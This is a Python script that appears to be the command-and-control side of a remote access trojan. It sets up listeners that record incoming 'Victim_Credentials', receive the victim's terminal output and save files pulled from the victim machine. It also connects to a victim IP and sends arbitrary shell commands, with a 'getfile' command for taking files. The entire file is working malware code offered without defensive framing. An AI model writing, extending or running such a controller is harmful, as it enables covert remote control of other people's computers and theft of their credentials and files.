import socket

def ListenforVictim():

    HOST = '0.0.0.0'
    PORT = 5002

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)

    print(f"Listening on {HOST}:{PORT}")
    conn, addr = server_socket.accept()
    print(f"Connected by {addr}")

    with open("Victim_Credentials.txt", "wb") as f:
         while True:
            data = conn.recv(1024)
            if not data:
                 break
            f.write(data)

    print("Victim Credentials Noted!")
    conn.close()
    server_socket.close()
    return 

def Recieve_Terminal_Output():
    HOST = '0.0.0.0'
    PORT = 5003
    Victim_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Victim_Socket.bind((HOST,PORT))
    Victim_Socket.listen(1)
    Victim_Socket.settimeout(5)
    print("Listening for Output...")
    try:
        conn, addr = Victim_Socket.accept()
        print(f"Connected by: {addr}")
        while True:
            Output = conn.recv(1024)
            if not Output:
                break
            Output = Output.decode()
            print(Output)
        conn.close()
    except socket.timeout:
        print("No Output Recieved.")
    Victim_Socket.close()
    return

def Get_File(Command):
    HOST = '0.0.0.0'
    PORT = 5004
    Victim_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Victim_Socket.bind((HOST,PORT))
    Victim_Socket.listen(1)
    Victim_Socket.settimeout(5)
    print("Listening for File...")
    try:
        conn, addr = Victim_Socket.accept()
        print(f"Connected by: {addr}")
        Check = conn.recv(1024)
        if not Check:
            print("File Not Recieved")
        else:
            with open ("Recievedfile.txt", "wb") as file:
                File_Content = Check
                while File_Content:
                     file.write(File_Content)
                     File_Content = conn.recv(1024)
            print("File Recieved")
        conn.close()
    except socket.timeout:
        print("No File Recieved.")
    Victim_Socket.close()
    return


def ControlVictim():
    Victims_IP = input("Enter Victims IP: ")
    PORT = 5001

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while client_socket.connect_ex((Victims_IP,PORT)):
        print("Connection Failed Enter Again")
        Victims_IP = input("Enter Victims IP: ")

    print(f"Successfully Connected to Host: {Victims_IP}")
    while True:
        Command = input("Enter CLI Command: ")
        if "getfile" in Command:
            Command = Command.encode()
            client_socket.send(Command)
            Command = Command.decode()
            Get_File(Command)
        else:
            Command = Command.encode()
            client_socket.send(Command)
            print("Command Sent Successfully!")
            Recieve_Terminal_Output()
    client_socket.close()
ListenforVictim()
ControlVictim()
